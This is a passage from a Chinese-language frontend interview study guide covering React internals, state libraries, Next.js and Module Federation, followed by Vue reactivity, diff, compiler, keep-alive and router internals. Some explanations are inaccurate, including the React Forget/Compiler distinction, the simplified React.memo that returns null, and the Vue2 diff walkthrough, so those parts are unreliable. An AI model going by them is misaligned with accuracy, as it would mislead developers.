// 返回Promise → 视为suspended child
// → 向上查找Suspense boundary → 显示fallback
// → Promise resolved → 重新渲染,显示实际组件
```

**useTransition:**

```jsx
function App() {
  const [isPending, startTransition] = useTransition();
  const [query, setQuery] = useState('');
  const [results, setResults] = useState([]);

  const handleSearch = (e) => {
    setQuery(e.target.value); // 高优先级 (立即响应)

    startTransition(() => {
      setResults(search(e.target.value)); // 低优先级 (可中断)
    });
  };

  return (
    <div>
      <input value={query} onChange={handleSearch} />
      {isPending ? <Spinner /> : <Results items={results} />}
    </div>
  );
}
```

---

### 8.9 Next.js SSR原理

```javascript
// getStaticProps: 构建时生成静态HTML
export async function getStaticProps(context) {
  const posts = await fetchPosts();
  return { props: { posts }, revalidate: 60 }; // ISR
}

// getServerSideProps: 每次请求时SSR
export async function getServerSideProps(context) {
  const data = await fetchDataFromDB();
  return { props: { data } };
  // 或 { notFound: true } / { redirect: { destination: '/login' } }
}
```

```
ISR (Incremental Static Regeneration):

请求 → 检查缓存
  ├─ 无缓存 → SSR → 缓存HTML → 返回
  ├─ 未过期 → 直接返回缓存
  └─ 已过期 → 返回旧缓存 + 触发后台revalidate → 下次返回新缓存
```

---

### 8.10 Server Component 与 React Compiler

#### 8.10.1 Server Component (RSC)

```jsx
// Server Component (默认): 服务端执行,不发送JS
async function UsersPage() {
  const users = await db.query('SELECT * FROM users');
  return <UserList users={users} />;
}

// Client Component: 有hooks和交互
'use client';
function UserCard({ user }) {
  const [liked, setLiked] = useState(false);
  return <button onClick={() => setLiked(!liked)}>{user.name}</button>;
}
```

```
Server Component vs Client Component:

Server:  服务端执行,无bundle | 直接访问DB | async/await | ✗ hooks/状态
Client:  hooks/事件/浏览器API | bundle包含 | ✗ 直接访问DB
```

#### 8.10.2 React Compiler & React Forget

```javascript
// React Compiler: Babel Plugin,自动优化
// 源码:
function Counter({ count, onIncrement }) {
  return <button onClick={onIncrement}>{count}</button>;
}

// 编译后(自动添加memo+比较函数):
const _comp = React.memo(function Counter({ count, onIncrement }) {
  return <button onClick={onIncrement}>{count}</button>;
});

// React Forget: 更激进的优化编译器
// - 自动添加 React.memo
// - 自动修正 useCallback/useMemo
// - 自动提取不必要的闭包捕获
```

---

### 8.11 状态管理: Zustand / Jotai / Recoil

#### 8.11.1 Zustand原理

```javascript
// Zustand: 极简状态管理 (~100行核心)
import { create } from 'zustand';

const useStore = create((set, get) => ({
  bears: 0,
  increase: () => set(s => ({ bears: s.bears + 1 })),
}));

function Counter() {
  const bears = useStore(s => s.bears); // 精确选择,减少re-render
  return <h1>{bears}</h1>;
}

// 极简实现:
function createStore(init) {
  let state; const listeners = new Set();
  const set = (partial) => {
    state = { ...state, ...(typeof partial==='function' ? partial(state) : partial) };
    listeners.forEach(l => l(state));
  };
  state = init(set, () => state);
  return { getState: () => state, setState: set,
    subscribe: l => { listeners.add(l); return () => listeners.delete(l); } };
}
```

#### 8.11.2 Jotai原理

```javascript
// Jotai: 原子(Atom)模型,细粒度响应式
import { atom, useAtom } from 'jotai';

const countAtom = atom(0);
const doubledAtom = atom(get => get(countAtom) * 2); // 派生原子

function Counter() {
  const [count, setCount] = useAtom(countAtom);
  const [doubled] = useAtom(doubledAtom);
  return (
    <div>
      <span>{count} ({doubled})</span>
      <button onClick={() => setCount(c => c + 1)}>+</button>
    </div>
  );
}
// 原理: React外部存储 + Subscription + 依赖追踪
```

#### 8.11.3 Recoil原理

```javascript
// Recoil: atom+selector模型,与React并发模式深度集成
const todoListState = atom({ key: 'todoList', default: [] });

const filteredState = selector({
  key: 'filtered',
  get: ({ get }) => get(todoListState).filter(t => t.done),
});

// useRecoilState读取Fiber tree的lane上下文
// 自动参与React的并发调度
```

---

### 8.12 Redux单向数据流

```
Action → Dispatch → Reducer → New State → View Update
  ↑                                              │
  └──────────────────────────────────────────────┘

为什么单向数据流重要:
  - 可预测性: 任何状态变化都来自明确的action
  - 可追踪: action是纯文本描述 {type:'INCREMENT'}
  - 可重现: 同action序列 → 同状态
  - 可测试: reducer是纯函数
  - 时间旅行: action序列可存储/回放(Redux DevTools)
```

```
Redux vs MobX vs Zustand:

Redux: Store→Action→Reducer→Store→UI (纯函数)
       大型项目 + DevTools时间旅行

MobX: Action↔Observable State↔Computed↔UI (响应式)
       中型项目,自动追踪依赖

Zustand: Store(极简) → UI
       轻量项目,无样板代码
```

---

### 8.13 React性能优化

#### 8.13.1 避免重复渲染

```jsx
// ❌ 原因1: 父组件渲染 → 所有子组件无条件重新渲染
function Parent() {
  const [count, setCount] = useState(0);
  return (
    <div>
      <button onClick={() => setCount(c => c + 1)}>+{count}</button>
      <Header />   {/* 不需要count,但每次re-render */}
      <SideBar />  {/* 不需要count,但每次re-render */}
    </div>
  );
}

// ❌ 原因2: 每次新建对象/数组引用
<Child config={{ theme: 'dark' }} />  // 每次都是新对象

// ❌ 原因3: 每次新建函数
<Child onClick={() => doSomething()} />
```

#### 8.13.2 React.memo / useMemo / useCallback

```jsx
// React.memo: 浅比较props,相同则跳过render
const MemoChild = React.memo(function Child({ data, onClick }) {
  return <div onClick={onClick}>{data.title}</div>;
});

// useMemo: 缓存计算结果
const filtered = useMemo(() => items.filter(f), [items, filter]);

// useCallback: 缓存函数引用
const handleClick = useCallback(() => action(id), [id]);
```

#### 8.13.3 Immutable原则

```javascript
// ✅ 创建新引用
setState({ ...state, items: [...state.items, newItem] });

// ✅ Immer
import { produce } from 'immer';
setState(produce(draft => { draft.items.push(newItem); }));

// 为什么重要: React.memo/useMemo基于浅比较(===)
```

#### 8.13.4 React.memo原理

```javascript
// 简化实现:
function memo(Component, arePropsEqual) {
  return function MemoizedComponent(props) {
    if (prevProps && (arePropsEqual
      ? arePropsEqual(prevProps, props)
      : shallowEqual(prevProps, props))) {
      return null; // 跳过render,复用上次DOM
    }
    prevProps = props;
    return <Component {...props} />;
  };
}

// shallowEqual: 对第一层属性做 === 比较
```

#### 8.13.5 useMemo为什么不能乱用

```
❌ 过早优化: useMemo(() => 1+1, []) → 计算极快,缓存开销更大
❌ 错误依赖: useMemo(() => compute(count), []) → 永远是初始值
❌ 渲染中setState: useMemo里调用setState → 可能死循环

✅ 昂贵计算: 排序/搜索/复杂计算 → 收益大于开销
✅ 稳定引用: 传给React.memo子组件的对象/数组
✅ 派生计算: 避免每次render重新计算
```

---

### 8.14 React合成事件原理

```
React 17+ Fiber上的事件处理:

用户点击button → 浏览器dispatchEvent('click')
  ↓
React捕获事件(挂载在root节点, 而非document)
  ↓
构建SyntheticEvent (跨浏览器兼容)
  ↓
从target fiber向上遍历(通过return指针):
  FiberNode(button) → fiber.return → ... → root
    │
    │ 收集所有onClick处理器
    │ 按capturing → target → bubbling顺序执行
    │
  FiberNode(div)

为什么用合成事件:
  1. 跨浏览器兼容 (IE/Firefox/Chrome行为一致)
  2. 事件委托 (减少绑定数量)
  3. 对象池复用 (减少GC压力)
  4. React 17+根节点隔离 (支持多版本React共存)
```

---

### 8.15 Hooks为什么不能条件调用

```javascript
// ❌ 错误:
function Comp({ show }) {
  const [a, setA] = useState(0);  // Hook #1
  if (show) {
    const [b, setB] = useState('');  // Hook #2 (条件)
  }
  const [c, setC] = useState(0);  // Hook #3/#2?
  return <div>{a}{show && b}{c}</div>;
}

// show=true: Hook链表=[#1, #2, #3]
// show=false: Hook链表=[#1, #3]
// → Hook#3被错配到Hook#2的位置 → 状态错乱!

// ✅ 正确: 始终按顺序调用
function Comp({ show }) {
  const [a, setA] = useState(0);
  const [b, setB] = useState(''); // 始终调用
  const [c, setC] = useState(0);
  return <div>{a}{show && b}{c}</div>;
}
```

---

### 8.16 React Router原理

#### 8.16.1 Hash路由 vs History路由

```javascript
// Hash: https://app.com/#/home
//   ✓ 不需要服务器配置,刷新不404
//   ✗ URL带#号,SEO不友好

// History: https://app.com/home
//   ✓ 干净URL,SEO友好
//   ✗ 需要服务器配置(所有路径返回index.html)
```

#### 8.16.2 React Router实现原理

```javascript
// 1. 监听路由变化
function useRouter() {
  const [path, setPath] = useState(window.location.pathname);
  useEffect(() => {
    const fn = () => setPath(window.location.pathname);
    window.addEventListener('popstate', fn);
    return () => window.removeEventListener('popstate', fn);
  }, []);
  return path;
}

// 2. 路由匹配 (将 /users/:id 转为正则)
function matchRoute(path, routePath) {
  const paramNames = [];
  const regex = routePath.replace(/:(\w+)/g, (_, name) => {
    paramNames.push(name);
    return '([^/]+)';
  });
  const match = path.match(new RegExp('^' + regex + '$'));
  if (!match) return null;
  return paramNames.reduce((params, name, i) => {
    params[name] = match[i + 1];
    return params;
  }, {});
}

// 3. 嵌套路由通过<Outlet>渲染子路由
```

```
React Router匹配算法:

URL: /users/123/posts/456

Routes:
  <Routes>
    <Route path="/" element={<Home />} />
    <Route path="/users/:userId" element={<User />}>
      <Route path="posts/:postId" element={<Post />} />
    </Route>
  </Routes>

匹配过程:
  1. / → 否
  2. /users/:userId → 是, userId=123
     → User渲染, Outlet渲染子路由
  3. posts/:postId → 是, postId=456 → Post渲染
```

---

### 8.17 React Query原理

```javascript
import { useQuery, useMutation, useQueryClient } from '@tanstack/react-query';

function User({ id }) {
  const { data, isLoading } = useQuery({
    queryKey: ['user', id],        // 唯一缓存键
    queryFn: () => fetch(`/api/users/${id}`).then(r => r.json()),
    staleTime: 5 * 60 * 1000,     // 5分钟内不重新获取
    cacheTime: 10 * 60 * 1000,    // 缓存保留10分钟后GC
    retry: 3,                      // 失败重试3次
  });
  if (isLoading) return <Spinner />;
  return <div>{data.name}</div>;
}

// 乐观更新: 立即更新UI,出错时回滚
const mutation = useMutation({
  mutationFn: (todo) => api.createTodo(todo),
  onMutate: async (todo) => {
    await queryClient.cancelQueries(['todos']);
    const previous = queryClient.getQueryData(['todos']);
    queryClient.setQueryData(['todos'], old => [...old, todo]);
    return { previous }; // 返回给onError回滚
  },
  onError: (err, todo, ctx) => {
    queryClient.setQueryData(['todos'], ctx.previous);
  },
  onSettled: () => {
    queryClient.invalidateQueries(['todos']); // 最终同步
  },
});
```

```
React Query缓存生命周期:
  1. queryFn执行 → loading
  2. 数据返回 → 存入cache (staleTime计时开始)
  3. staleTime内 → 直接用缓存
  4. staleTime后 → 后台重新获取 + 同时返回缓存
  5. cacheTime后无引用 → GC清理
```

---

### 8.18 React权限系统实现

```javascript
// 基于RBAC的权限系统:

const permissions = {
  'user:read':   ['admin','editor','viewer'],
  'user:write':  ['admin','editor'],
  'user:delete': ['admin'],
};

function usePermission(action, resource) {
  const { user } = useAuth();
  return permissions[`${resource}:${action}`]?.includes(user?.role) ?? false;
}

const Can = ({ action, resource, children, fallback = null }) => {
  return usePermission(action, resource) ? children : fallback;
};

// 使用:
<Can action="delete" resource="user" fallback={<span>无权限</span>}>
  <DeleteButton />
</Can>

// 高阶组件:
function withPermission(Component, action, resource) {
  return (props) => usePermission(action, resource)
    ? <Component {...props} /> : <AccessDenied />;
}
```

---

### 8.19 React微前端实现 (Module Federation)

```javascript
// Webpack 5 Module Federation: 共享代码,独立部署

// Host (主应用):
new ModuleFederationPlugin({
  name: 'host',
  remotes: {
    remoteApp: 'remoteApp@https://remote.com/remoteEntry.js',
  },
  shared: { react: { singleton: true }, 'react-dom': { singleton: true } },
});

// Remote (子应用):
new ModuleFederationPlugin({
  name: 'remoteApp',
  filename: 'remoteEntry.js',
  exposes: {
    './ProductList': './src/ProductList',
    './UserProfile': './src/UserProfile',
  },
  shared: { react: { singleton: true } },
});

// Host中使用Remote组件:
const RemoteProductList = React.lazy(() => import('remoteApp/ProductList'));
```

```
Module Federation架构:

┌────────────┐     remoteEntry.js     ┌────────────┐
│  Host App  │ ←────────────────────  │ Remote App │
│            │    ProductList.js      │            │
│  <Remote   │ ←──── chunk ─────────→ │ exposes:   │
│   Product  │                        │  ProductList│
│   List />  │   (共享react/react-dom) │  UserProfile│
└────────────┘                        └────────────┘
```

---

### 8.20 React大规模状态管理方案

```
大规模React应用状态分层:

┌─────────────────────────────────────────────────────────┐
│  Global (Redux Toolkit / Zustand)                       │
│  → 用户认证, 主题, 全局通知, 跨页面共享状态              │
└────────────────────┬────────────────────────────────────┘
┌────────────────────┴────────────────────────────────────┐
│  Feature (Context / Jotai)                              │
│  → 功能模块内共享: 多个独立Context/Store                 │
│  → 避免单一巨型Context (所有Consumer重渲染)               │
└────────────────────┬────────────────────────────────────┘
┌────────────────────┴────────────────────────────────────┐
│  Local (useState / useReducer)                         │
│  → 组件私有: 表单, 临时UI, 动画                          │
└─────────────────────────────────────────────────────────┘

实践建议:
  1. 状态尽量下沉 (不放根组件)
  2. Context按功能拆分 (AuthContext, ThemeContext分开)
  3. Server State → React Query/SWR (不放Redux)
  4. URL作为状态 (搜索/筛选/分页 → URLSearchParams)
  5. 派生状态用selector/memo: 避免重复计算
  6. Immutable优先: 方便DevTools调试
```

```
推荐架构组合:

  React 18 + Concurrent Rendering
        +
  Next.js App Router (RSC)      ← Server State
        +
  TanStack Query (Client RPC)   ← Server Cache State
        +
  Zustand (Global UI State)     ← 用户偏好/认证/主题
        +
  Jotai (Feature State)         ← 局部复杂交互
        +
  useState (Component State)    ← 表单/UI

不推荐单一Redux用于所有状态:
  - Server State在Redux中 → 手动管理缓存/重试/轮询
  - boilerplate → Redux Toolkit减少
  - DevTools → 仍是最好的时间旅行调试工具
```

---

*（React终极题库 · 完）*



---

*Chapters 5 & 6 — 完*

---

## Chapter 9: Vue超完整题库

### 9.1 Vue2 vs Vue3区别

#### 响应式系统

**Vue2: Object.defineProperty**

```javascript
// Vue2 响应式原理（简化版）
function defineReactive(obj, key, val) {
  Object.defineProperty(obj, key, {
    enumerable: true,
    configurable: true,
    get() {
      console.log(`读取 ${key}`)
      return val
    },
    set(newVal) {
      if (newVal !== val) {
        console.log(`设置 ${key}: ${newVal}`)
        val = newVal
        // 触发通知更新
      }
    }
  })
}
```

缺陷：
- **无法监听新增属性**：`Vue.set(obj, 'newProp', 1)` 变通方案
- **无法监听删除**：`Vue.delete(obj, 'prop')` 变通方案
- **数组下标**：Vue2.2+ 才支持通过索引设置（性能代价大）
- 深度嵌套时需要递归，初始化时性能差

**Vue3: Proxy**

```javascript
// Vue3 响应式原理
function reactive(obj) {
  return new Proxy(obj, {
    get(target, key, receiver) {
      const res = Reflect.get(target, key, receiver)
      track(target, key)
      return typeof res === 'object' ? reactive(res) : res
    },
    set(target, key, value, receiver) {
      const oldValue = target[key]
      const res = Reflect.set(target, key, value, receiver)
      if (oldValue !== value) {
        trigger(target, key)
      }
      return res
    },
    deleteProperty(target, key) {
      const hadKey = key in target
      const res = Reflect.deleteProperty(target, key)
      if (hadKey && res) {
        trigger(target, key)
      }
      return res
    }
  })
}
```

#### TypeScript支持

- Vue2: 通过 `vue-property-decorator` 等装饰器库模拟类型支持，不够原生
- Vue3: 源码完全用 TypeScript 重写，提供完美的类型推导

```typescript
// Vue3 defineProps 类型推断
const props = defineProps<{
  name: string
  age?: number
}>()

// withDefaults 提供默认值
const props = withDefaults(defineProps<{
  list: string[]
}>(), {
  list: () => []
})
```

#### Composition API

Vue2 使用 Options API（data/computed/methods/watch 分散）；Vue3 提供 Composition API，相同逻辑可以聚合，代码复用更优雅（mixin → composables）。

#### Virtual DOM实现

Vue2: 基于 `src/core/vdom/create-element.js`，手动编写 VNode 类型判断。Vue3: 引入 `block tree` 和 `patchFlag`，虚拟 DOM 遍历大幅减少。

#### 性能

- 打包体积：Vue3 (22KB gzipped) vs Vue2 (~33KB)
- 初始渲染：快 20-50%（Proxy + block tree）
- 更新性能：平均快 2-3 倍
- 内存占用：减少近 50%

---

### 9.2 Vue响应式原理（defineProperty缺点 vs Proxy优势）

#### defineProperty 的三大缺陷

```javascript
// 缺陷1：新增属性不响应
const vm = new Vue({ data: { a: 1 } })
vm.b = 2        // ❌ 不触发更新
vm.$set(vm, 'b', 2) // ✅ 变通方案

// 缺陷2：删除属性不响应
delete vm.a     // ❌ 不触发更新
vm.$delete(vm, 'a') // ✅ 变通方案

// 缺陷3：数组直接用索引赋值不响应
vm.items[0] = {} // ❌ 在Vue2中不响应
vm.$set(vm.items, 0, {}) // ✅
vm.items.splice(0, 1, {}) // ✅
```

#### Proxy 的优势

```javascript
// 优势1：天然支持新增/删除属性
const obj = reactive({ a: 1 })
obj.b = 2     // ✅ 自动触发 set
delete obj.a  // ✅ 自动触发 deleteProperty

// 优势2：支持数组下标
const arr = reactive([1, 2, 3])
arr[0] = 10   // ✅ 正常工作

// 优势3：惰性代理（按需递归）
// Vue3只在访问时才对嵌套对象做代理，Vue2初始化时递归所有属性

// 优势4：非原始值自动嵌套
const state = reactive({
  user: { name: 'John', address: { city: 'BJ' } }
})
state.user.address.city = 'SH' // ✅ 深层响应式

// 优势5：性能更好，不需要defineProperty的get/set包装
// 优势6：可以拦截更多操作（has: key in obj, apply: 函数调用等）
```

#### Vue3 的依赖追踪（基于 Proxy）

```
访问响应式属性 → track(target, key) 记录当前activeEffect
设置响应式属性 → trigger(target, key) 找到所有依赖的effect执行
```

---

### 9.3 ref vs reactive 区别

| 特性 | ref | reactive |
|------|-----|---------|
| 接受类型 | 基本类型 + 对象 | 仅对象/数组 |
| 实现方式 | 对基本类型包装为{value: x}，内部用reactive处理对象 | 直接用Proxy |
| 模板访问 | 自动展开（不需要.value） | 直接访问 |
| 解构 | 丢失响应式 | 解构后丢失响应式（需用toRefs） |
| 类型推导 | 需要泛型指定 | 自动推导 |

```typescript
// ref: 基本类型必须用ref，对象内部会自动转reactive
const count = ref(0)
count.value++

const obj = ref({ a: 1 })
obj.value.a++          // 需要 .value

// reactive: 适合复杂响应式状态
const state = reactive({
  count: 0,
  user: { name: 'John' }
})

// reactive解构丢失响应式 → 使用toRefs
const state = reactive({ a: 1, b: 2 })
const { a, b } = toRefs(state) // a, b 变成 ref，保留响应式

// toRef: 创建一个 ref，保持与源属性的引用关系
const age = toRef(state, 'a') // age.value === state.a
```

**原理简析**：
- `ref` 内部创建了一个包裹对象，通过 `get value() / set value()` 拦截，当 value 是对象时内部调用 `reactive()` 处理。
- `reactive` 直接返回 `new Proxy(target, ...)`。

---

### 9.4 computed 原理

```typescript
// 用法
const doubleCount = computed(() => count.value * 2)

// 惰性求值 + 缓存
// 只有依赖变化时才重新计算，否则返回缓存值
```

**原理图**：

```
computed(() => a.value + b.value)
    │
    ├── 首次访问：执行 getter，返回结果，收集依赖 (a, b)
    │
    ├── a.value 变化 → trigger(computed)
    │                   ├── computed.dirty = true（标记需要重新计算）
    │                   └── 通知所有依赖 computed 的 effect（dirty check）
    │
    └── 下次访问：dirty=true → 重新执行 getter → 返回新值
                  dirty=false → 直接返回缓存值
```

**源码级实现要点**：
```javascript
// 简化版
class ComputedRefImpl {
  constructor(getter) {
    this._dirty = true
    this._value = null
    this.effect = effect(getter, () => {
      this._dirty = true   // 依赖变化时标记 dirty
      trigger(this, 'value')
    })
  }

  get value() {
    if (this._dirty) {
      this._value = this.effect.run() // 重新计算
      this._dirty = false
    }
    return this._value
  }
}
```

关键点：computed 本质是一个有缓存的 effect，`dirty` 标志实现惰性重算。

---

### 9.5 watch vs watchEffect 区别

| 特性 | watch | watchEffect |
|------|-------|------------|
| 依赖收集 | 手动指定 source | 自动收集（立即执行） |
| 首次执行 | 不执行（默认） | 立即执行一次 |
| 回调参数 | (newVal, oldVal) | 没有 oldVal |
| 停止 | 返回 stop() | 同上 |

```typescript
// watch: 惰性，只有变化才执行，可访问旧值
watch(() => state.count, (newVal, oldVal) => {
  console.log(`${oldVal} → ${newVal}`)
}, { immediate: true }) // immediate: true 时首次也执行

// watchEffect: 自动追踪回调中用到的所有响应式数据
watchEffect(() => {
  console.log(state.count) // 自动追踪 count 依赖
  console.log(state.name)  // 自动追踪 name 依赖
})

// 监听多个源
watch([ref1, ref2], ([v1, v2], [o1, o2]) => {
  console.log(v1, v2)
})

// 深度监听
watch(() => deepObj, (val) => {}, { deep: true })

// 停止监听
const stop = watch(...)
stop() // 停止
```

**选择策略**：
- 需要旧值 → `watch`
- 回调内明确知道依赖 → `watch`
- 只需响应式状态副作用，不关心旧值 → `watchEffect`（更简洁）

---

### 9.6 nextTick 原理（微任务队列 + flush callbacks）

```javascript
// 用法
async function update() {
  state.name = 'new name'
  await nextTick()  // DOM已更新
  console.log(document.querySelector('.title').textContent)
}
```

**原理**：

```
nextTick(callback)
    │
    ├── callback 推入 callbacks 队列
    │
    └── 调用 flushCallbacks（异步执行队列中所有回调）

flushCallbacks 实现：
    └── Promise.resolve().then(flushCallbacks)
            │
            └── 微任务执行 flushCallbacks
                    │
                    └── while(queue.length) queue.shift()()
                            │
                            └── 依次执行所有入队的回调
```

**微任务选择**：Vue3 优先使用 `Promise.resolve()` → 微任务；Vue2 依次降级：`Promise` → `MutationObserver` → `setImmediate` → `setTimeout(fn, 0)`。

**为什么需要 flush callbacks 队列？**

```javascript
// 场景：连续多次修改同一个响应式数据
state.count = 1
state.count = 2
state.count = 3
await nextTick() // 只在最后一次微任务中更新一次DOM，而不是三次
```

Vue 批量更新（Batching）：同一事件循环内的多次状态变更会被合并，只触发一次 DOM 更新。`flushSchedulerQueue` 是批量的核心，它在微任务中执行所有 pending 的 watcher 更新。

---

### 9.7 Vue diff 原理（patch策略 + 递归diff + key的重要性）

#### diff策略（同层比较）

```
旧 VNode 树
   │
   ├── div (same) → diff children
   │       ├── p (same) → diff children
   │       └── span (moved) → move
   │
   └── h1 (removed)
```

Vue2 diff 核心：`updateChildren` 方法，4指针头尾比较

```
旧 children: [A, B, C, D]
新 children: [A, B, E, C]

指针: oldS=0(A) oldE=3(D)  newS=0(A) newE=2(C)

Step1: A vs A → same → 复用，oldS++, newS++
Step2: B vs B → same → 复用，oldS++, newS++
Step3: D vs E → patch → 复用但内容变，oldE--, newS++
Step4: C vs C → same → 复用，oldS++, newS++
Step5: E vs D → (尾部比较) → 移动
```

#### key 的重要性

```html
<!-- 没有 key: 所有节点 patch，但可能不移动 -->
<div v-for="item in items" :key="item.id">
  <!-- 正确：唯一标识，节点可复用 -->
</div>

<!-- 问题案例：没有 key 时，删除中间项 -->
<!-- items: [A, B, C] → [A, C] -->
<!-- 无key：patch比较，发现C内容匹配B标签，B标签被复用 -->
<!-- 有key：直接知道删除了B，效率更高 -->
```

**无 key 陷阱**：
```html
<!-- 计数器列表，不用key导致状态错位 -->
<div v-for="(item, index) in list" :key="index"> <!-- ❌ index作key危险 -->
  <input v-model="item.value" />
</div>
<!-- 列表前插入新项，index全部变化，DOM全部重新创建 -->
```

**有 key 优势**：
1. 精确匹配节点，最小化 DOM 操作
2. 列表重排时触发正确的 transition
3. 保持组件状态（如 input 焦点）

---

### 9.8 patchFlag 与 Block Tree

#### patchFlag（动态标记）

```javascript
// 编译器输出示例
const __sfc = {
  render(_ctx) {
    return _h('div', {
      class: 'static-class',  // 静态，无标记
      id: _ctx.dynamicId,      // 动态 → 需要 patchFlag
    }, [
      _h('span', 1 /* TEXT */, _ctx.msg),        // 文本动态
      _h('span', 8 /* CLASS */, _ctx.className), // CLASS 动态
    ])
  }
}
```

**patchFlag 标志位**：
| 标志 | 含义 |
|------|------|
| 1 | TEXT，仅文本内容变化 |
| 2 | CLASS，class 变化 |
| 4 | STYLE，style 变化 |
| 8 | PROPS，props 变化 |
| 16 | FULL_PROPS，所有 props 变化 |
| 32 | HYDRATE_EVENTS，事件绑定变化 |
| 64 | STABLE_FRAGMENT，fragment 子节点稳定 |

#### Block Tree（块树）

```javascript
// Vue3 编译器为每个 block 生成独立的 children 数组
// 只有 block 内的动态节点才需要 diff

// 模板:
<div>
  <h1>{{ title }}</h1>     <!-- 动态：patchFlag=1 -->
  <p>{{ desc }}</p>          <!-- 动态：patchFlag=1 -->
  <span>静态文本</span>       <!-- 静态：不在 diff 范围内 -->
</div>

// 编译后 block tree：
Block {
  dynamicChildren: [
    { type: 'span', patchFlag: 1, children: title },   // 只 diff 这些
    { type: 'p', patchFlag: 1, children: desc }
  ],
  children: [ /* 全部静态+动态节点 */ ]
}
// diff 时只遍历 dynamicChildren，O(动态节点数) 而非 O(总节点数)
```

#### 静态提升（Static Hoisting）

```javascript
// Vue3 编译时提升到 render 函数外部，只创建一次

// 编译前：
<div>
  <span>静态文本</span>
  <p>{{ dynamic }}</p>
</div>

// 编译后（Vue3）：
const _hoisted_1 = _createElementVNode('span', null, '静态文本')
return function render(_ctx, _cache) {
  return _openBlock(), _createElementBlock('div', null, [
    _hoisted_1,                        // 复用，提升的静态节点
    _createElementVNode('p', null, _ctx.dynamic)  // 动态创建
  ])
}
```

---

### 9.9 Vue Compiler 原理（template → render函数 → VNode）

#### 编译三阶段

```
template 字符串
    │
    ├── 1. parse（解析）: template → AST（抽象语法树）
    │       └── 正则匹配标签、属性、指令、插值表达式
    │
    ├── 2. transform（转换）: AST → 增强AST（添加scopeId、patchFlag）
    │       └── 插件化：v-if →三元表达式，v-for →循环函数
    │
    └── 3. codegen（代码生成）: 增强AST → render 函数代码字符串
            └── new Function('with(this) { return ' + code)()
                    │
                    └── 生成类似：
                        _c('div', { id: _ctx.id }, [
                          _v(_toDisplayString(_ctx.msg))
                        ])
```

#### AST 节点类型

```javascript
// div id="app">{{ message }}<span v-if="show">条件</span></div>
{
  type: 'Element',
  tag: 'div',
  props: [{ type: 'Attribute', name: 'id', value: 'app' }],
  children: [
    { type: 'Interpolation', content: { content: 'message' } },
    {
      type: 'Element', tag: 'span',
      props: [],
      children: [{ type: 'Text', content: '条件' }],
      branchIndex: 0,
    }
  ]
}
```

#### render 函数执行 → VNode

```javascript
// 运行时生成的 render 函数
render() {
  return _c('div', { id: 'app' }, [
    _v(_toDisplayString(_ctx.message)),
    _ctx.show ? _c('span', null, [_v('条件')]) : _createEmptyVNode()
  ])
}

function _c(tag, data, children) {
  return createVNode(tag, data, children)
}
```

---

### 9.10 template 为什么比 JSX 更快

```
JSX: 所有组件调用都是动态的
     ↓
     每次 render 需要调用所有子组件函数
     → Virtual DOM diff 时才知道哪些变了
     → 无法预知哪些是动态的

Template: 编译时已知静态/动态边界
     ↓
     patchFlag 告诉运行时精确的动态类型
     block tree 只 diff 动态部分
     静态子树完全跳过 diff

性能差距来源：
  1. 编译期优化（patchFlag/静态提升）JSX 无法做到
  2. 运行时 diff 范围：template O(动态节点数)，JSX O(总节点数)
  3. 内存：JSX 每次创建新函数对象，template 更精简
```

JSX 的优势在于灵活性，template 的优势在于编译优化。Vue3 的 SFC（单文件组件）也支持 render 函数和 JSX，兼顾两边。

---

### 9.11 keep-alive 原理

#### 核心思想

`keep-alive` 缓存组件实例而非销毁，保留组件状态（data、滚动位置等）。

```
<keep-alive :include="['Home', 'About']" :exclude="'Login'">
  <component :is="currentView" />
</keep-alive>
```

#### 缓存策略

```javascript
// 内部维护两个 Map（LRU 最近最少使用）
this.cache = new Map()   // key → vnode
this.keys = []           // 按访问顺序记录 key，max 限制后淘汰最老的

// 命中缓存
if (cache[key]) {
  vnode.componentInstance = cache[key].componentInstance
  remove(keys, key)
  keys.push(key)
} else {
  cache[key] = vnode
  keys.push(key)
  if (max && keys.length > max) {
    const oldKey = keys.shift()
    delete cache[oldKey]
  }
}
```

#### activated / deactivated 钩子

```javascript
// 被缓存的组件：
export default {
  activated() {
    // 组件从缓存中被激活
    console.log('组件被激活')
  },
  deactivated() {
    // 组件被停用（切走但未销毁）
    console.log('组件被停用')
  }
}
```

#### 生命周期调用时机

```
首次挂载: created → mounted → activated
切走（缓存）: deactivated
切回（缓存）: activated
销毁: deactivated → beforeUnmount → unmounted
```

---

### 9.12 Teleport 与 Suspense

#### Teleport（传送门）

```vue
<!-- 将 modal 传送到 body -->
<teleport to="body">
  <div class="modal">内容</div>
</teleport>

<!-- 条件传送 -->
<teleport to="body" :disabled="!isOpen">
  <div>只在 isOpen 时传送</div>
</teleport>
```

**原理**：在挂载时将真实 DOM 移动到指定位置，渲染逻辑仍在当前组件，输出位置在目标节点。

#### Suspense（悬念）

```vue
<suspense>
  <template #default>
    <async-component />
  </template>
  <template #fallback>
    <loading-spinner />
  </template>
</suspense>
```

Suspense 利用 `async setup`（返回 Promise），在 setup resolve 前显示 `#fallback`，resolve 后渲染 `#default`。

---

### 9.13 Vue Router 原理

#### hash vs history 模式

| 特性 | hash 模式 | history 模式 |
|------|----------|-------------|
| URL | `localhost/#/path` | `localhost/path` |
| 刷新 | 不需要 server 配置 | 需要 server 代理所有路径到 index.html |
| 部署 | 任意静态服务器 | 需要 nginx rewrite 或后端配置 |
| 兼容性 | IE8+ | 需要 history.pushState（IE10+） |
| 跨域 | 天然无跨域 | 需要后端配合 |

**hash 原理**：
```javascript
window.addEventListener('hashchange', () => {
  const hash = window.location.hash.slice(1)
  router.match(hash)
})
window.location.hash = '/home'
```

**history 原理**：
```javascript
history.pushState(state, title, '/home')
window.addEventListener('popstate', () => {
  router.match(location.pathname)
})
// 服务端需要：nginx try_files $uri $uri/ /index.html
```

#### 路由守卫

```javascript
// 全局前置守卫
router.beforeEach((to, from, next) => {
  if (to.meta.requiresAuth && !isAuth) {
    next('/login')
  } else {
    next()
  }
})

// 组件内守卫
export default {
  beforeRouteEnter(to, from, next) {
    next(vm => { vm.xxx = '可在回调中访问实例' })
  },
  beforeRouteUpdate(to, from, next) {
    this.loadData(to.params.id)
    next()
  },
  beforeRouteLeave(to, from, next) {
    if (this.hasUnsavedChanges) next(false) else next()
  }
}

// 执行顺序：
// 导航触发
//   → 全局 beforeEach (队列)
//   → 重用的组件 beforeRouteUpdate
//   → 路由配置的 beforeEnter
//   → 组件的 beforeRouteEnter
//   → 全局 async 守卫（router.beforeResolve）
//   → DOM 更新
//   → 组件 updated + beforeRouteEnter 的 next() 回调
```

---

### 9.14 Vuex vs Pinia 区别

| 特性 | Vuex | Pinia |
|------|------|-------|
